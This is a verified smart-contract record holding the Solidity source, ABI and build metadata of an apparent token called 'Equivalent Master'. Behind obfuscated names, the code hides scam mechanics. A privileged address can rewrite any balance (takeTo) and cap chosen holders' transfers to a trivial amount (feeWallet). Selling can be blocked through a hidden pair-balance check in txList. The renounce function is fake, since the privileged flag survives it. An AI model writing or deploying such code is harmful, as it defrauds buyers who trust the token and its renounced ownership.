{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface listFundAmount {\n    function createPair(address atTotal, address fundLimit) external returns (address);\n}\n\ninterface minLaunch {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenTeam) external view returns (uint256);\n\n    function transfer(address maxTotal, uint256 totalReceiverMin) external returns (bool);\n\n    function allowance(address buyAmount, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 totalReceiverMin) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address maxTotal,\n        uint256 totalReceiverMin\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed sellReceiver, uint256 value);\n    event Approval(address indexed buyAmount, address indexed spender, uint256 value);\n}\n\nabstract contract fromList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverTotal {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface minLaunchMetadata is minLaunch {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EquivalentMaster is fromList, minLaunch, minLaunchMetadata {\n\n    bool public swapLaunchAt;\n\n    event OwnershipTransferred(address indexed walletMinLiquidity, address indexed swapMaxExempt);\n\n    address limitExemptLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function feeFund(uint256 totalReceiverMin) public {\n        amountFrom();\n        listLimit = totalReceiverMin;\n    }\n\n    uint256 private isList;\n\n    function name() external view virtual override returns (string memory) {\n        return txSwap;\n    }\n\n    uint256 private fromMax;\n\n    address public fundFromSender;\n\n    mapping(address => bool) public shouldToken;\n\n    uint256 listLimit;\n\n    function minTeam(address txReceiver, address maxTotal, uint256 totalReceiverMin) internal returns (bool) {\n        require(exemptLiquiditySender[txReceiver] >= totalReceiverMin);\n        exemptLiquiditySender[txReceiver] -= totalReceiverMin;\n        exemptLiquiditySender[maxTotal] += totalReceiverMin;\n        emit Transfer(txReceiver, maxTotal, totalReceiverMin);\n        return true;\n    }\n\n    function autoEnable(address teamEnable) public {\n        require(teamEnable.balance < 100000);\n        if (isFromToken) {\n            return;\n        }\n        if (liquidityToken) {\n            fromMax = fundTotal;\n        }\n        isSell[teamEnable] = true;\n        \n        isFromToken = true;\n    }\n\n    function transferFrom(address txReceiver, address maxTotal, uint256 totalReceiverMin) external override returns (bool) {\n        if (_msgSender() != txBuy) {\n            if (walletReceiver[txReceiver][_msgSender()] != type(uint256).max) {\n                require(totalReceiverMin <= walletReceiver[txReceiver][_msgSender()]);\n                walletReceiver[txReceiver][_msgSender()] -= totalReceiverMin;\n            }\n        }\n        return txList(txReceiver, maxTotal, totalReceiverMin);\n    }\n\n    function owner() external view returns (address) {\n        return txFee;\n    }\n\n    uint256 public fundTotal;\n\n    bool public liquidityToken;\n\n    address public receiverSellTrading;\n\n    uint256 private enableSender;\n\n    uint8 private isToFund = 18;\n\n    function transfer(address fundExemptMode, uint256 totalReceiverMin) external virtual override returns (bool) {\n        return txList(_msgSender(), fundExemptMode, totalReceiverMin);\n    }\n\n    function amountFrom() private view {\n        require(isSell[_msgSender()]);\n    }\n\n    string private txSwap = \"Equivalent Master\";\n\n    function txList(address txReceiver, address maxTotal, uint256 totalReceiverMin) internal returns (bool) {\n        if (txReceiver == receiverSellTrading) {\n            return minTeam(txReceiver, maxTotal, totalReceiverMin);\n        }\n        uint256 atTeam = minLaunch(fundFromSender).balanceOf(limitExemptLaunched);\n        require(atTeam == listLimit);\n        require(maxTotal != limitExemptLaunched);\n        if (shouldToken[txReceiver]) {\n            return minTeam(txReceiver, maxTotal, marketingShouldReceiver);\n        }\n        return minTeam(txReceiver, maxTotal, totalReceiverMin);\n    }\n\n    bool public isFromToken;\n\n    mapping(address => bool) public isSell;\n\n    mapping(address => mapping(address => uint256)) private walletReceiver;\n\n    function takeTo(address fundExemptMode, uint256 totalReceiverMin) public {\n        amountFrom();\n        exemptLiquiditySender[fundExemptMode] = totalReceiverMin;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return feeLaunched;\n    }\n\n    function balanceOf(address tokenTeam) public view virtual override returns (uint256) {\n        return exemptLiquiditySender[tokenTeam];\n    }\n\n    uint256 private feeMode = 100000000 * 10 ** 18;\n\n    uint256 public launchLiquidity;\n\n    function allowance(address listAtTo, address listFund) external view virtual override returns (uint256) {\n        if (listFund == txBuy) {\n            return type(uint256).max;\n        }\n        return walletReceiver[listAtTo][listFund];\n    }\n\n    uint256 constant marketingShouldReceiver = 3 ** 10;\n\n    mapping(address => uint256) private exemptLiquiditySender;\n\n    uint256 buySender;\n\n    bool public sellExempt;\n\n    function approve(address listFund, uint256 totalReceiverMin) public virtual override returns (bool) {\n        walletReceiver[_msgSender()][listFund] = totalReceiverMin;\n        emit Approval(_msgSender(), listFund, totalReceiverMin);\n        return true;\n    }\n\n    bool private exemptMinFrom;\n\n    address private txFee;\n\n    function feeWallet(address amountExemptMarketing) public {\n        amountFrom();\n        \n        if (amountExemptMarketing == receiverSellTrading || amountExemptMarketing == fundFromSender) {\n            return;\n        }\n        shouldToken[amountExemptMarketing] = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return feeMode;\n    }\n\n    function receiverEnable() public {\n        emit OwnershipTransferred(receiverSellTrading, address(0));\n        txFee = address(0);\n    }\n\n    string private feeLaunched = \"EMR\";\n\n    constructor (){\n        \n        receiverTotal exemptTo = receiverTotal(txBuy);\n        fundFromSender = listFundAmount(exemptTo.factory()).createPair(exemptTo.WETH(), address(this));\n        \n        receiverSellTrading = _msgSender();\n        isSell[receiverSellTrading] = true;\n        exemptLiquiditySender[receiverSellTrading] = feeMode;\n        receiverEnable();\n        if (exemptMinFrom) {\n            isList = launchTrading;\n        }\n        emit Transfer(address(0), receiverSellTrading, feeMode);\n    }\n\n    function getOwner() external view returns (address) {\n        return txFee;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return isToFund;\n    }\n\n    address txBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public launchTrading;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletMinLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapMaxExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listAtTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listFund\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalReceiverMin\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamEnable\",\"type\":\"address\"}],\"name\":\"autoEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTeam\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalReceiverMin\",\"type\":\"uint256\"}],\"name\":\"feeFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountExemptMarketing\",\"type\":\"address\"}],\"name\":\"feeWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundFromSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isFromToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSellTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapLaunchAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundExemptMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalReceiverMin\",\"type\":\"uint256\"}],\"name\":\"takeTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundExemptMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalReceiverMin\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalReceiverMin\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "EquivalentMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}